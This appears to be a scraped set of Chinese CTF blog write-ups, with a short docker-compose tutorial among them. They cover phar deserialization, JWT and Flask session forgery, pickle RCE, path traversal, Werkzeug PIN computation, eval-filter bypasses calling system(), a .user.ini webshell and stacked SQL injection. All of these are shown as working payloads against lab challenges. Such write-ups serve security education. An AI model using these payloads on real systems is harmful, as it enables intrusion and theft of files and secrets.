FileList($_SESSION[‘sandbox’])时，会先调用构造函数，把“$_SESSION[‘sandbox’]”目录下的所有文件，都放到 $a-&gt;files中，注意这是个数组，解释了为什么，在后面构造payload时，$this-&gt;files要等于一个数组。然后$a-&gt;Name();调用了一个FileList中并没有的方法，就会自动调用 __all($func, $args)函数，其中$func=Name。然后让 $a-&gt;files里的所有文件，都去调用这个方法。并把结果，存储在以filename为一级键名，方法为二级键名的数组中。然后Size方法同样如此。 name Size filename1 xx xx filename2 xx xx 也就时说，它在程序中的作用就是，遍历我们上传的所有文件，并把它们的信息，储存在$a-&gt;result这个二维数组中。 1.4 function __destruct() 12345678foreach ($this-&gt;results as $filename =&gt; $result) &#123; $table .= &#x27;&lt;tr&gt;&#x27;; foreach ($result as $func =&gt; $value) &#123; $table .= &#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27; . htmlentities($value) . &#x27;&lt;/td&gt;&#x27;; &#125; $table .= &#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27; . htmlentities($filename) . &#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;涓嬭浇&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;鍒犻櫎&lt;/a&gt;&lt;/td&gt;&#x27;; $table .= &#x27;&lt;/tr&gt;&#x27;;&#125; foreach ($this-&gt;results as $filename =&gt; $result) 每次把每个一级数组的值，传递给$result,即filename1[] foreach ($result as $func =&gt; $value) 每次把每个二级数组的值，传递给$value echo table 最后打印出来全部数据 解决了读取的数据，无法输出的问题 1.5 phar（重点） 我的理解，我们可以把一个序列化的对象，储存在phar格式的文件中，生成后（一定要是生成后），即使我们把格式给改了，也不影响它的作用：用一些文件包含函数，如果我们以phar://协议去访问这个文件，那么就可以把那个对象给反序列化。 php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，别人测试后，受影响的函数如下： 利用条件： ① phar文件要能够上传到服务器端 ② 要有可用的魔术方法作为“跳板” ③ 要有文件操作函数，如file_exists()，fopen()，file_get_contents()，file() ③ 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤 实践 File类中的close方法会获取文件内容，如果能触发该方法，就有可能获取flag。 User类中存在close方法，并且该方法在对象销毁时执行。 同时FileList类中存在__call魔术方法，并且类没有close方法。如果一个Filelist对象调用了close()方法，根据__call方法的代码可以知道，文件的close方法会被执行，就可能拿到flag。 根据以上三条线索，梳理一下可以得出结论: 如果能创建一个user的对象，其db变量是一个FileList对象，对象中的文件名为flag的位置。这样的话，当user对象销毁时，db变量的close方法被执行；而db变量没有close方法，这样就会触发__call魔术方法，进而变成了执行File对象的close方法。通过分析FileList类的析构方法destruct可以知道，close方法执行后存在results变量里的结果会加入到table变量中被打印出来，也就是flag会被打印出来。 想实现上述想法，可以借助phar的伪协议。 生成phar文件后在删除的时候进行触发即可得到flag。(delete触发也需要满足if (file_exists($filename) &amp;&amp; !is_dir($filename)) ，不过file_exists()也支持phar所以文件名中有phar不影响) 12345678910111213141516171819202122232425262728293031323334353637383940//运行如下PHP文件，生成一个phar文件，更改后缀名为png进行上传。&lt;?phpclass User &#123; public $db;&#125;class File &#123; public $filename;&#125;class FileList &#123; private $files; private $results; private $funcs; public function __construct() &#123; $file = new File(); $file-&gt;filename = &#x27;/flag.txt&#x27;; $this-&gt;files = array($file); $this-&gt;results = array(); $this-&gt;funcs = array(); &#125;&#125;@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$o = new User();$o-&gt;db = new FileList();$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt; 生成phar.phar 修改后缀名为jpg 上传 抓包删除页面 修改filename为filename=phar://phar.gif 查看response 得到flag 在File类中，close方法存在file_get_contents()函数，在User中，会调用改方法$this-&gt;db-&gt;close()，如果有回显的化，我们就可以直接构造payload： 12345678910&lt;?phpclass User &#123; public $db;&#125;class File &#123; public $filename = &quot;/flag.txt&quot;;&#125;$a = new User();$a-&gt;db = new File();?&gt; 然后放到phar文件后，就可以了。 但事实并没有回显，那么我们就让$this-&gt;db = new FileList()，让它去调用close，然后调用__call(),然后再调用 __destruct()函数，打印结果。完美，可是我想不到 payload： 123456789101112131415161718192021222324252627282930313233&lt;?phpclass User &#123; public $db;&#125;class File &#123; public $filename;&#125;class FileList &#123; private $files; public function __construct() &#123; $file = new File(); $file-&gt;filename = &quot;/flag.txt&quot;; $this-&gt;files = array($file); &#125;&#125;$a = new User();$a-&gt;db = new FileList();$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$o = new User();$o-&gt;db = new FileList();$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt; 3.总结 感觉只要和序列化有关的，就在魔术方法里，找高危函数就完事了，有file_get_contents()的，就是任意文件读取，有eval的，就是任意命令执行。 [Day1 Web2] ikun 鸡你太美~！！ 页面中有提示要买到lv6小电视，翻了好几页没发现lv6,然后测试了一下发现有500页，手动看也不是办法，写个脚本看看lv6小电视到底藏在哪里！ 1234567891011121314151617181920212223from concurrent.futures import ThreadPoolExecutorimport timeimport requestsr=requests.session()def requestUrl(url): response = requests.get(url) #下载页面 if &quot;lv6.png&quot; in response.text: print(response.url) return responsedef main(): url=&quot;http://c8d9a312-36e4-442f-8d1c-b5f14a5290b9.node3.buuoj.cn/&quot; user=&#123;&quot;_xsrf&quot;:&quot;2%7Cd9aca2c4%7C141a48c4004d577321918c738b2c5968%7C1584286112&quot;,&quot;username&quot;:&quot;sa&quot;,&quot;password&quot;:&quot;sa&quot;&#125; r.post(url,data=user) seed=[ url+&quot;shop?page=&quot;+str(i) for i in range(1,500) ] with ThreadPoolExecutor(max_workers=10) as executor1: executor1.map(requestUrl,seed)if __name__ == &#x27;__main__&#x27;: main() 在181页 修改购买金额price是无效的，但是修改折扣discount是有效的 购买后就跳转到了b1g_m4mber 观察burpsuit的包发现认证方式为JWT,所以需要伪造JWT(JSON-Web-Token),用到jwtcrack,来爆破密钥 所以，我的加密密钥就是：1Kun。然后我们去验证一下，这个网站可以提供验证服务：https://jwt.io/。当我们使用破解出来的key时，我们能完美还原出原始数据，这证明我们的key是正确的。 或者pip安装PyJWT模块来生成jwt 123&gt;&gt;&gt; import jwt&gt;&gt;&gt; jwt.encode(&#123;&#x27;username&#x27;: &#x27;admin&#x27;&#125;, &#x27;1Kun&#x27;, algorithm=&#x27;HS256&#x27;)b&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.dD2hbntzt9yS-uufk1yalEMjkvv4fo5jeP9XMeJm_f0&#x27; 根据密钥重新加密admin提交到页面后 1234567891011import pickleimport urllibclass catflag(object): def __reduce__(self): #return (eval, (&quot;ls /&quot;,)) return (eval, (&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,))payload= pickle.dumps(catflag())print(payload)print (urllib.quote(payload)) 生成后提交即可c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A. https://www.cnblogs.com/Chr1sto/p/12257528.html https://blog.csdn.net/weixin_44077544/article/details/102844554 攻防世界TimeKeeper Hits 静态资源 SESSION、SECRET_KEY debug pin码生成机制 更新flag命令 1docker exec 容器id /bin/bash -c &quot;echo ciscn&#123;flag&#125;&gt;/flag&quot; 漏洞设置 目录穿越，可任意文件读取 格式化字符串，可获取SECRET_KEY，从而伪造session成为管理员 上传tar文件自解压，可利用软连接读文件 debug模式，生成pin码的关键信息都可获取到，计算pin码，执行命令 目录穿越 加载静态资源相关代码： @users.route('/asserts/') def static_handler(path): filename = app.root_path+'/asserts/'+path print filename if os.path.isfile(filename): return send_file(filename) else: abort(404) 可以导致跨目录读文件 119:37-p0:~ $ curl http://192.168.1.121/asserts/..%2f..%2f..%2f..%2fflag CISCN&#123;this_is_a_sample_flag&#125; 格式化字符串+SESSION伪造+软连接读文件 代码中class User(db.Model,SQLAlchemy)继承了SQLAlchemy类，SQLAlchemy类中有请求上下文current_app变量，通过测试可以获取。 注册POC: &#123;user.__class__.__mro__[3].__init__.__globals__[current_app].config&#125;，登陆后访问个人中心，拿到secret_key。 利用获取的secret_key签名session，获取admin权限，相关代码： import json from flask.sessions import SecureCookieSessionInterface class Mockapp(object): def __init__(self, secret_key): self.secret_key = secret_key def encode_session(self ,session): app = Mockapp(self.key) #print session session = json.loads(session) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.dumps(session) session = '&#123;&quot;admin&quot;:true,&quot;id&quot;:100,&quot;username&quot;:&quot;admin&quot;&#125;' session = self.encode_session(session) 获取admin权限后可以添加商品，商品图片可以是打包的tar包，从而利用软连接读文件 1ln -s /flag 1.png tar cvfp ./flag.tar 1.png 上传后读取flag Debug命令执行 经过对Debug Pin码生成机制的研究，可以发现需要下列相关信息： `md5_list = [ ‘root’, #当前用户，可通过读取/etc/passwd获取 ‘flask.app’, #一般情况为固定值 ‘Flask’, #一般情况为固定值 ‘/usr/local/lib/python2.7/dist-packages/flask/app.pyc’, #可通过debug错误页面获取 ‘2485377892354’, #mac地址的十进制，通过读取/sys/class/net/eth0/address获取mac地址 如果不是映射端口 可以通过arp ip命令获取 ‘0c5b39a3-bba2-472c-a43d-8e013b2874e8’ #机器名，通过读取/proc/sys/kernel/random/boot_id 或/etc/machine-id获取 ]` 生成pin码代码： 1def get_pin(md5_list): h = hashlib.md5() for bit in md5_list: if not bit: continue if isinstance(bit, unicode): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit) h.update(b&#x27;cookiesalt&#x27;) h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9] for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = num return rv 拿到pin码便可执行命令 love_math 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#x27;c&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; //例子 c=20-1 $content = $_GET[&#x27;c&#x27;]; if (strlen($content) &gt;= 80) &#123; die(&quot;太长了不会算&quot;); &#125; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123; die(&quot;请不要输入奇奇怪怪的字符&quot;); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;]; preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;请不要输入奇奇怪怪的函数&quot;); &#125; &#125; //帮你算出答案 eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);&#125; 可以看到题目限制了参数的长度要小于80，且不能包含空格、制表符、换行、单双引号、反引号、[]。并且输入的字符串需要为$whitelist中的函数。 最终会执行 eval('echo '.$content.';'); 既然想要getshell，我们必须要能够获取任意字符串。由于单双引号被ban掉了，我们无法从函数名中提取字符串。因此我们只能想办法从函数的返回结果中获取。 成功执行 执行系统命令system(‘ls’) 现在我们需要想办法读取flag.php的内容，三条路： 1、使用php函数readfile等函数读取文件，但是需要flag.php中的.。 2、使用system等命令执行函数配合通配符*读取文件，但是需要*。 3、使用$_GET全局变量手动传入参数getshell。 上面的三种方法都建立在字符长度小于80的条件下。 方法1 为了缩短字符长度，我们可以将函数base_convert赋值给一个短变量名,由于白名单的限制，我们最少需要两个字符，即$pi。 1($pi=base_convert)(2146934604002,10,36)(&#x27;flag.php&#x27;); 我们需要异或出.然后与flag和php拼接到一起，传入readfile。 本地搭建环境fuzz 12345&lt;?php$a = $_GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];echo $a^$b; 发现无法异或出.。 但是我们发现dechex函数可以把10进制转换为16进制，我们可以再异或出hex2bin，来获取任意ASCII字符。 最终payload 1($pi=base_convert)(2146934604002,10,36)($pi(727432,10,36).$pi(37907361743,10,36)(dechex(46)).$pi(33037,10,36)); 很明显，超长了 本地测试下在没有长度限制下，是否可以读取 方法2 同样的，我们fuzz发现无法异或出*，需要借助hex2bin函数。 system 1php &gt; echo base_convert(&#x27;system&#x27;,36,10);1751504350 最初payload nl (Number of Lines) 将指定的文件添加行号标注后写到标准输出。如果不指定文件或指定文件为&quot;-&quot; ，程序将从标准输入读取数据。 1234[root@oracledb study]# nl test1.log 1 2011 2 2012 3 2013 1($pi=base_convert)(1751504350,10,36)($pi(37907361743,10,36)(dechex(426836762666))) 12system(nl *)($pi=base_convert)(1751504350,10,36)($pi(1438255411,14,34)(dechex(1852579882))) 成功小于80 方法3 这个思路来自xq17和shadow师傅，已经过本人同意。 刚开始我们知道可以异或出_。并且$没有被waf，因此我们可以使用$_GET全局变量手动传入参数getshell。 虽然[]被过滤，我们依然可以使用&#123;&#125;来提取数组中的值。 通过fuzz，我们可以得到 11^n=_; 5^r=G; 1^t=E; 7^c=T 不难构造出 $pi=base_convert;$pi=$pi(53179,10,36)^$pi(1109136,10,36);$&#123;$pi&#125;&#123;0&#125;($&#123;$pi&#125;&#123;1&#125;) 方法4 其实还有种方法就是利用getallheaders方法，因为是apache中间件，所以可以用getallheaders方法 通过getallheaders构造可控headers，system执行。来自先知社区的ROIS WP 那么多数学函数，实际上唯一能用的只有进制转换类，即base_convert、dechex，通过其能导出[0-9a-z]在内的字符。 经过一大堆失败的实验，如： 1`// phpinfo();``(``base_convert``(55490343972,10,36))();` 1`// system(&#x27;cat /*&#x27;);``$pi``=``base_convert``(9911,10,28);``base_convert``(1751504350,10,36)(``$pi``(99).``$pi``(97).``$pi``(116).``$pi``(32).``$pi``(42));` 1`// system($_GET);``$pi``=``base_convert``(16191,10,36);``$pi``=``$pi``(95).``$pi``(71).``$pi``(69).``$pi``(84);``base_convert``(1751504350,10,36)($``$pi``&#123;pi&#125;);` 最后使用system(getallheaders()&#123;9&#125;) 1`$pi``=``base_convert``;``$pi``(371235972282,10,28)((``$pi``(8768397090111664438,10,30))()&#123;9&#125;)` RoarCTF easy_clac 题目改编自Love_math，题目的难点在于设置的waf，限制了字符串，只能数字通行。在buuctf平台复现 calc.php题目源码: 123456789101112131415&lt;?php error_reporting(0); if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__); &#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;); &#125; ?&gt; 与love_math还是有本质区别的，没有限制数学函数，并且过滤了$,^等。 那我们可以通过~取反来尝试读取当前目录。 发现输入字符会403，但是输入数字却可以正常执行。结合题目给的源码，设置了waf用来截断字符，通行数字。 这里通过三篇文章学习到了一些绕过方法，一二篇都是parse_str的，通过传参php的字符串解析问题，首发于先知社区。第三篇是http走私攻击 利用PHP函数parse_str绕过IDS、IPS和WAF 利用PHP的字符串解析特性Bypass 协议层的攻击——HTTP请求走私 这里因为限制了单引号，因此我们还是可以用取反操作，直接不需要单引号，转化为字符串。来尝试读取目录 1`var_dump(scandir(``&#x27;.&#x27;``)) var_dump(scandir((~%D1)))` 在尝试读下根目录 尝试读取f1agg文件 本来想用system()直接读的,disable_funcionts禁了 用readfile读取f1agg 还有种方法就是还是用数学函数来实现,payload: 1`base_convert``(2146934604002,10,36)(hex2bin(``dechex``(47)).``base_convert``(25254448,10,36))` http走私是由于前端代理服务器和后端源服务器之间的一些差异导致请求走私。 通过CL-CL的方法来执行 利用CL-TE或者TE-CL 根据我的理解，其实对于这道题都一样，前端代理和后端源都会执行一遍get传参，前端代理有waf，后端源执行返回正常的。 可能我的理解有所偏颇，但是知道并且能理解就行，不要太钻牛角尖。 后面的步骤与方法一 一样 这里附上很神奇payload: &amp;amp为| 1`((((((``2``).(``0``))&#123;``0``&#125;)&#123;``0``&#125;)|(((``0``/``0``).(``0``))&#123;``1``&#125;)).(((((``-``1``).(``0``))&#123;``0``&#125;)|(((``0``/``0``).(``0``))&#123;``1``&#125;))&amp;((((``1``).(``0``))&#123;``0``&#125;)|(((``999``*``*``999``).(``1``))&#123;``2``&#125;))).((((``2``).(``0``))&#123;``0``&#125;)|((((``999``*``*``999``).(``1``))&#123;``0``&#125;)&amp;(((``999``*``*``999``).(``1``))&#123;``2``&#125;))).(((``999``*``*``999``).(``1``))&#123;``0``&#125;).(((``0``/``0``).(``0``))&#123;``1``&#125;).((((``999``*``*``999``).(``1``))&#123;``1``&#125;)&amp;((((``-``1``).(``0``))&#123;``0``&#125;)|(((``0``/``0``).(``0``))&#123;``1``&#125;))).(((``999``*``*``999``).(``1``))&#123;``0``&#125;).((((``2``).(``0``))&#123;``0``&#125;)|((((``999``*``*``999``).(``1``))&#123;``0``&#125;)&amp;(((``999``*``*``999``).(``1``))&#123;``1``&#125;))).(((((``-``1``).(``0``))&#123;``0``&#125;)|(((``0``/``0``).(``0``))&#123;``1``&#125;))&amp;((((``1``).(``0``))&#123;``0``&#125;)|(((``999``*``*``999``).(``1``))&#123;``2``&#125;))))(((((``999``*``*``999``).(``1``))&#123;``2``&#125;).(((``999``*``*``999``).(``1``))&#123;``0``&#125;).((((``999``*``*``999``).(``1``))&#123;``1``&#125;)&amp;((((``-``1``).(``0``))&#123;``0``&#125;)|(((``0``/``0``).(``0``))&#123;``1``&#125;))).(((((``-``1``).(``0``))&#123;``0``&#125;)|(((``0``/``0``).(``0``))&#123;``1``&#125;))&amp;((((``1``).(``0``))&#123;``0``&#125;)|(((``999``*``*``999``).(``1``))&#123;``2``&#125;))))(((((``-``1``).(``0``))&#123;``0``&#125;)|(((((``8``).(``0``))&#123;``0``&#125;)&amp;((((``-``1``).(``0``))&#123;``0``&#125;)|(((``999``*``*``999``).(``1``))&#123;``1``&#125;)))|((((``2``).(``0``))&#123;``0``&#125;)&amp;((((``-``1``).(``0``))&#123;``0``&#125;)|(((``999``*``*``999``).(``1``))&#123;``1``&#125;))))).((((``999``*``*``999``).(``1``))&#123;``2``&#125;)|((((``4``).(``0``))&#123;``0``&#125;)&amp;(((``-``1``).(``0``))&#123;``0``&#125;))).(((``1``).(``1``))&#123;``0``&#125;).((((``0``/``0``).(``0``))&#123;``1``&#125;)|(((``-``2``).(``1``))&#123;``0``&#125;)&amp;(((``1``).(``0``))&#123;``0``&#125;)).((((``999``*``*``999``).(``1``))&#123;``2``&#125;)|(((``-``2``).(``1``))&#123;``0``&#125;)&amp;(((``1``).(``0``))&#123;``0``&#125;)).((((``999``*``*``999``).(``1``))&#123;``2``&#125;)|(((``-``2``).(``1``))&#123;``0``&#125;)&amp;(((``1``).(``0``))&#123;``0``&#125;))))` 学习文章:https://github.red/roarctf-web-writeup/#easy_calc"},{"title":".user.ini的利用","date":"2020-02-28","updated":"2024-03-19","path":"2020/02/28/user-ini的利用/","text":".user.ini 我们先在php手册上看一下对.user.ini的介绍： 也就是说我们可以在.user.ini中设置php.ini中PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置，而且只要是在使用 CGI／FastCGI 模式的服务器上都可以使用.user.ini 在p牛的文章中提到了两个有趣的设置：auto_prepend_file和auto_append_file 我们再到手册中看了下这两个设置的定义： 大致意思就是：我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：require(./a.jpg); 这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效） SUCTF2019题目中的利用 看过.user.ini的分析后我们的思路应该比较清晰了，我们可以上传一个这样的.user.ini： 12GIF89aauto_prepend_file=a.jpg 此时我们注意到上传目录下还有一个index.php，我们正好需要该目录下有一个可执行php文件，那这简直暴露了考点就是.user.ini，看来这个思路应该是可行的 然后再上传一个这样的图片马a.jpg： 12GIF89a&lt;script language=&#x27;php&#x27;&gt;system(&#x27;cat /flag&#x27;);&lt;/script&gt; 最后，我们访问http://192.168.177.152:9021/uploads/6683eb5bfa1174bd139499256f60b7ab/index.php 即可得到flag .user.ini实战利用的可能性 综上所述.user.ini的利用条件如下： 服务器脚本语言为PHP 服务器使用CGI／FastCGI模式 上传目录下要有可执行的php文件 从这来看.user.ini要比.htaccess的应用范围要广一些，毕竟.htaccess只能用于Apache 但仔细推敲我们就会感到**“上传目录下要有可执行的php文件”**这个要求在文件上传中也比较苛刻，应该没有天才开发者会把上传文件放在主目录或者把php文件放在上传文件夹。 参考文章： https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html 从SUCTF 2019 CheckIn 浅谈.user.ini的利用"},{"title":"docker构建web环境","date":"2020-02-28","updated":"2024-03-19","path":"2020/02/28/docker构建web环境/","text":"先简单理解 docker 的使用过程，它分为镜像构建与容器启动。 镜像构建：即创建一个镜像，它包含安装运行所需的环境、程序代码等。这个创建过程就是使用 dockerfile 来完成的。 容器启动：容器最终运行起来是通过拉取构建好的镜像，通过一系列运行指令（如端口映射、外部数据挂载、环境变量等）来启动服务的。针对单个容器，这可以通过 docker run 来运行。 而如果涉及多个容器的运行（如服务编排）就可以通过 docker-compose 来实现，它可以轻松的将多个容器作为 service 来运行（当然也可仅运行其中的某个），并且提供了 scale (服务扩容) 的功能。 简单总结： 1.dockerfile: 构建镜像； 2.docker run: 启动容器； 3.docker-compose: 启动服务； dockerfile的作用是从无到有的构建镜像。它包含安装运行所需的环境、程序代码等。这个创建过程就是使用 dockerfile 来完成的。Dockerfile - 为 docker build 命令准备的，用于建立一个独立的 image ，在 docker-compose 里也可以用来实时 build docker-compose.yml - 为 docker-compose 准备的脚本，可以同时管理多个 container ，包括他们之间的关系、用官方 image 还是自己 build 、各种网络端口定义、储存空间定义等 docker-compose是编排容器的。例如，你有一个php镜像，一个mysql镜像，一个nginx镜像。如果没有docker-compose，那么每次启动的时候，你需要敲各个容器的启动参数，环境变量，容器命名，指定不同容器的链接参数等等一系列的操作，相当繁琐。而用了docker-composer之后，你就可以把这些命令一次性写在docker-composer.yml文件中，以后每次启动这一整个环境（含3个容器）的时候，你只要敲一个docker-composer up命令就ok了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// up 该命令十分强大，它将尝试自动完成包括构建镜像，（重新）创建服务，启动服务，并关联服务相关容器的一系列操作docker-compose up [options] [SERVICE...] // -d 比较常用，不会打印过程。//down 停止 up 命令所启动的容器，并移除网络。——这里需要特别注意，up 启动的，不应该使用rm 去删除，因为这样无法删除网络docker-compose down// run 命令docker-compose run [options] [-p PORT...] [-e KEY=VAL...] SERVICE [COMMAND] [ARGS...]// ps 查看项目中的所有容器docker-compose ps// restart 重启服务docker-compose restart [options] [SERVICE...]。// stop start 停止和开启容器docker-compose stop xxxdocker-compose start xxx// kill 强制停止某容器docker-compose kill -s SIGINT// rm 删除指定或所有的服务容器docker-compose rm -f [service]// build 重建某个容器，在 Dockerfile 发生了改变的时候，可以重建image。然后再 up 运行起来所有的容器docker-composer build //重建所有容器docker-compose build xxx //重建指定容器//exec 进入某个容器docker-compose exec -it 容器ID /bin/bash// images 查看compose文件中包含的镜像docker-compose images// pull 拉取依赖docker-compose pull [options] [SERVICE...]// push 推送服务依赖的镜像到 Docker 镜像仓库。docker-compose push// port 打印某容器的映射端口docker-compose port xxx// config 验证 docker-compose 文件格式是否正确docker-compose config// top 查看所有容器的进程docker-compose top 制作nginx的dockerfile文件，使用docker-compose启动服务"},{"title":"强网杯2019","date":"2020-02-28","updated":"2024-03-19","path":"2020/02/28/强网杯2019/","text":"随便注 堆叠注入 输入1' or '1有返回，输入'提示sql语法错误，输入select返回了过滤规则 1preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); 12345678910111213141516171819202122232425262728293031321&#x27;;show databases;#array(1) &#123; [0]=&gt; string(11) &quot;ctftraining&quot;&#125;array(1) &#123; [0]=&gt; string(9) &quot;supersqli&quot;&#125;1&#x27;;use supersqli;show tables;#array(1) &#123; [0]=&gt; string(16) &quot;1919810931114514&quot;&#125;array(1) &#123; [0]=&gt; string(5) &quot;words&quot;&#125;1&#x27;;use supersqli;describe `1919810931114514`;#array(6) &#123; [0]=&gt; string(4) &quot;flag&quot; [1]=&gt; string(12) &quot;varchar(100)&quot;1&#x27;;use supersqli;SET @getflag = CONCAT(&#x27;SELE&#x27;,&#x27;CT flag FROM `1919810931114514`&#x27;);PREPARE pr2 FROM @getflag;EXECUTE pr2;#array(1) &#123; [0]=&gt; string(38) &quot;flag&#123;c168d583ed0d4d7196967b28cbd0b5e9&#125;&quot;&#125; 高明的黑客 下载源码解压后发现…3306个文件 12 ⚡ root@kali /var/www/html/CTF/强网杯/Smart_hacker/src ls | wc -l3002 而且文件名和内容都离奇的很。。 ​ 难道这就是公司开发吗,i了i了~ 打开一些文件看看，发现好多文件里面都有危险函数GET，POST，exec，eval，assert 涨姿势时间到: 看了大佬的writeup知道是fuzz… 提示了是黑客，然后结合上面的代码可以猜测这些文件里面有黑客上传的一句话木马。可以看到里面有GET，POST，exec，eval，assert…但我们不知道哪个是一句话马，所以直接脚本来一个一个的试。先找到脚本中的_GET _POST方法，提取出传入的关键字，然后给关键字赋值echo xxx看看页面会不会输出我们的内容，如果是，则这个就是后门。先在本地启动apache服务器(或者php -S localhost:8080 -t 目录)，然后执行脚本。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586import osimport threadingfrom concurrent.futures.thread import ThreadPoolExecutorimport requestssession = requests.Session()url=&#x27;http://127.0.0.1/CTF/%e5%bc%ba%e7%bd%91%e6%9d%af/Smart_hacker/src/&#x27;path = &quot;/var/www/html/CTF/强网杯/Smart_hacker/src/&quot; # 文件夹目录files = os.listdir(path) # 得到文件夹下的所有文件名称mutex = threading.Lock()pool = ThreadPoolExecutor(max_workers=50)def read_file(file): f = open(path + &quot;/&quot; + file); # 打开文件 iter_f = iter(f); # 创建迭代器 str = &quot;&quot; for line in iter_f: # 遍历文件，一行行遍历，读取文本 str = str + line # 获取一个页面内所有参数 start = 0 params = &#123;&#125; while str.find(&quot;$_GET[&#x27;&quot;, start) != -1: # 找不到时会返回-1。str.find(str, beg=0, end=len(string)) pos2 = str.find(&quot;&#x27;]&quot;, str.find(&quot;$_GET[&#x27;&quot;, start) + 1) var = str[str.find(&quot;$_GET[&#x27;&quot;, start) + 7: pos2] # 提取参数 start = pos2 + 1 # 从这个位置后面继续寻找 params[var] = &#x27;echo(&quot;glzjin&quot;);&#x27; # 参数作为键值 并赋值 # print(var) start = 0 data = &#123;&#125; while str.find(&quot;$_POST[&#x27;&quot;, start) != -1: pos2 = str.find(&quot;&#x27;]&quot;, str.find(&quot;$_POST[&#x27;&quot;, start) + 1) var = str[str.find(&quot;$_POST[&#x27;&quot;, start) + 8: pos2] start = pos2 + 1 data[var] = 